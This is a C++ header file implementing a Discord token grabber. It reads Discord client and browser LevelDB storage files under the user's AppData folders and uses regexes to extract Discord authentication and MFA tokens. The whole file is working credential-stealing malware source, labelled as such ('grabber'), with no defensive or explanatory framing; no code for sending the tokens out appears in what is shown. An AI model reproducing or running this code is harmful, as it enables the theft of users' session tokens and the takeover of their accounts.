#pragma once

#include <string>
#include <vector>
#if !_HAS_CXX17
-> Please enable C++-17 <-
#else
#include <filesystem>
#endif

#include <fstream>
#include <regex>

#define DISCORD_MFA_TOKEN_REGEX "mfa\\.[\\w-]{84}"
#define DISCORD_TOKEN_REGEX "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"

namespace util
{
	namespace fs
	{
		// Check if folder/file exists on disk
		inline bool folder_exists(const std::filesystem::path& path) { std::error_code e;  return std::filesystem::exists(path, e); };

		// Read file from disk
		inline std::string read_file(std::filesystem::path file_path, bool english_only = false)
		{
			std::ifstream file(file_path.c_str(), std::ios::binary);
			std::string rawFile{};
			char character;

			if (english_only)
			{
				// Read only english characters
				while (file.get(character))
				{
					if ((character >= 32 && character <= 126))
						rawFile.push_back(character);
					else
						rawFile.push_back(' ');
				}
			}
			else
			{
				// Read all characters
				while (file.get(character))
					rawFile.push_back(character);
			}
			file.close();

			return rawFile;
		}

		// Scan folder contents on disk
		inline std::vector<std::filesystem::path> folder_scan(const std::filesystem::path& folderPath) {
			std::vector<std::filesystem::path> objects{};
			for (auto& entry : std::filesystem::directory_iterator(folderPath))
				objects.push_back(entry.path());

			return objects;
		}
	};

	namespace env
	{
		inline std::string get_env(const char* environment) {
			char* buf = nullptr;
			size_t sz = 0;

			if (_dupenv_s(&buf, &sz, environment) != 0 && buf == nullptr) {
				free(buf);
				return "";
			}

			std::string userPath{ buf };
			free(buf);

			return userPath;
		}
	};

	namespace regex
	{
		// A simple regex search
		inline uint32_t regex_search(std::string& string, const std::regex& regex, std::vector<std::string>& matchesOutput) {
			std::sregex_iterator curMatch(string.begin(), string.end(), regex);
			std::sregex_iterator lastMatch;
			uint32_t finds{ 0 };

			while (curMatch != lastMatch)
			{
				std::smatch match = *curMatch;
				matchesOutput.push_back(match.str());
				curMatch++;
				finds++;
			}

			return finds;
		}
	};
}

namespace grabber
{
	inline uint32_t find_tokens_in_file(const std::filesystem::path& path, std::vector<std::string>& output)
	{

		std::regex token_regex(DISCORD_TOKEN_REGEX);
		std::regex mfa_token_regex(DISCORD_MFA_TOKEN_REGEX);
		uint32_t finds{ 0 };

		// Read file
		std::string file = util::fs::read_file(path);

		// Search for tokens
		finds += util::regex::regex_search(file, token_regex, output);
		finds += util::regex::regex_search(file, mfa_token_regex, output);

		return finds;
	}

	inline uint32_t find_tokens_in_folder(const std::filesystem::path& path, std::vector<std::string>& output)
	{
		std::vector<std::filesystem::path> files = util::fs::folder_scan(path);
		uint32_t finds{ 0 };

		for (auto& file : files) {
			auto ext = file.extension();
			if (ext == ".log" || ext == ".ldb")
				finds += find_tokens_in_file(file, output);
		}

		return finds;
	}

	std::vector<std::string> grab_tokens(bool clients = true, bool browsers = false)
	{
		// Get Appdata paths
		std::string roaming = util::env::get_env("APPDATA"); if (roaming.front() != '\\') roaming.push_back('\\');
		std::string local = util::env::get_env("LOCALAPPDATA"); if (local.front() != '\\') local.push_back('\\');
		std::string leveldb = "Local Storage\\leveldb\\";

		std::vector<std::pair<std::string, std::string>> paths{};

		// Get Discord's local storage paths
		{
			if (clients) {
				paths.push_back({ "Discord", roaming + "Discord\\" + leveldb });											// Discord
				paths.push_back({ "Discord Canary", roaming + "discordcanary\\" + leveldb });								// Discord Canary
				paths.push_back({ "Discord PTB", roaming + "discordptb\\" + leveldb });										// Discord PTB
			}
			if (browsers) {
				paths.push_back({ "Google Chrome", local + "Google\\Chrome\\User Data\\Default\\" + leveldb });				// Google Chrome
				paths.push_back({ "Brave", local + "BraveSoftware\\Brave-Browser\\User Data\\Default\\" + leveldb });		// Brave
				paths.push_back({ "Opera", roaming + "Opera Software\\Opera Stable\\" + leveldb });							// Opera
				paths.push_back({ "Yandex", local + "Yandex\\YandexBrowser\\User Data\\Default\\" + leveldb });				// Yandex																										// Firefox

				// Firefox - It's local storage system is a half mystery, not really safe because I'm not sure I got to fully work..
				//std::vector<std::filesystem::path> users_paths = util::fs::folder_scan(local + "Mozilla\\Firefox\\Profiles\\");
				//for (auto& user_path : users_paths)
				//{
				//	if (user_path.filename().string().find("default-release") != std::string::npos)
				//	{
				//		paths.push_back({ "Firefox", user_path.string() + "\\cache2\\doomed\\" });
				//		break;
				//	}
				//}
			}
		}

		// Get tokens from each path
		std::vector<std::string> tokens;
		for (auto& path : paths)
			if (util::fs::folder_exists(path.second))
				find_tokens_in_folder(path.second, tokens); // Extract tokens

		return tokens;
	}
};